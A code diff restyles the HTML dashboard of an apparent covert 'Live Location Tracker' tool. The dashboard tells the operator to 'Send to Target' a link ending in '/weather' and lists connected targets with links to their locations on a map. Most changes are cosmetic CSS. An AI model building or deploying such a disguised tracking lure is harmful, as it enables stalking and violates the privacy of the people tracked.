@@ -5,27 +5,165 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Home</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <link rel="stylesheet" href="/glass.css">
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--txt);
+            font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+        }
+
+        header {
+            padding: 2.25rem 1.25rem 2.75rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, .1);
+            background: linear-gradient(180deg, rgba(255, 255, 255, .07), rgba(255, 255, 255, .02));
+            -webkit-backdrop-filter: blur(var(--blur)) saturate(150%);
+            backdrop-filter: blur(var(--blur)) saturate(150%);
+        }
+
+        .brand {
+            display: inline-flex;
+            align-items: center;
+            gap: .55rem;
+            margin-bottom: .35rem;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: clamp(1.5rem, 4vw, 2.1rem);
+            font-weight: 700;
+            letter-spacing: -.02em;
+        }
+
+        .credit {
+            display: inline-block;
+            margin: .35rem 0 0;
+            font-size: .8rem;
+            color: var(--txt-dim);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: color .3s var(--ease), border-color .3s var(--ease);
+        }
+
+        .credit:hover {
+            color: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .send {
+            display: inline-flex;
+            align-items: center;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: .4rem;
+            margin: 1.15rem auto 0;
+            padding: .55rem .9rem;
+            font-size: .85rem;
+            color: var(--txt-dim);
+            border-radius: 999px;
+        }
+
+        code {
+            padding: .18rem .5rem;
+            font-size: .82rem;
+            color: var(--accent);
+            word-break: break-all;
+            background: rgba(110, 231, 255, .1);
+            border: 1px solid rgba(110, 231, 255, .25);
+            border-radius: 8px;
+        }
+
+        #tar-content {
+            width: min(680px, 100%);
+            margin: 0 auto;
+            padding: 1.75rem 1.25rem 3rem;
+            display: flex;
+            flex-direction: column;
+            gap: .6rem;
+        }
+
+        .section-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: .75rem;
+            margin-bottom: .5rem;
+        }
+
+        .section-head h1 {
+            font-size: 1.05rem;
+            color: var(--txt-dim);
+            text-transform: uppercase;
+            letter-spacing: .12em;
+        }
+
+        .count {
+            font-size: .75rem;
+            color: var(--txt-dim);
+        }
+
+        .tar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: .75rem;
+            animation: revealUp .55s var(--ease) both;
+        }
+
+        .tar::after {
+            content: "›";
+            font-size: 1.1rem;
+            color: var(--txt-dim);
+            transition: transform .3s var(--ease), color .3s var(--ease);
+        }
+
+        .tar:hover::after {
+            transform: translateX(4px);
+            color: var(--accent);
+        }
+
+        .empty {
+            padding: 2.25rem 1rem;
+            text-align: center;
+            font-size: .9rem;
+            color: var(--txt-dim);
+        }
+    </style>
 </head>
 
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="http://madhanmaaz.netlify.app/" class="is-block mb-2">Created by madhanmaaz</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
+    <div class="glass-bg"></div>
+    <div class="glass-bg__grid"></div>
+
+    <header class="reveal">
+        <div class="brand">
+            <span class="g-dot" aria-hidden="true"></span>
+            <h1 class="g-title">Live Location <span class="g-accent">Tracker</span></h1>
+        </div>
+        <a href="http://madhanmaaz.netlify.app/" class="credit">Created by madhanmaaz</a>
+        <p class="send glass glass--pad">
+            <span>Send to Target:</span>
+            <code>{{ global.remoteURL }}/weather</code>
+        </p>
     </header>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
+    <section id="tar-content">
+        <div class="section-head">
+            <h1>Targets</h1>
+            <span class="count"><span class="g-dot" aria-hidden="true"></span> live</span>
+        </div>
 
         {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
+        <a href="/map?id={{ key }}" class="button is-fullwidth g-btn tar">
             {{ key }}
         </a>
         {{/}}
     </section>
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="/glass.js"></script>
     <script>
         const content = document.querySelector("#tar-content")
         const socket = io("", {
@@ -37,7 +175,7 @@
         socket.on("user-connected", newId => {
             const a = document.createElement('a')
             a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
+            a.className = "button is-fullwidth g-btn tar"
             a.innerText = newId
             content.appendChild(a)
         })
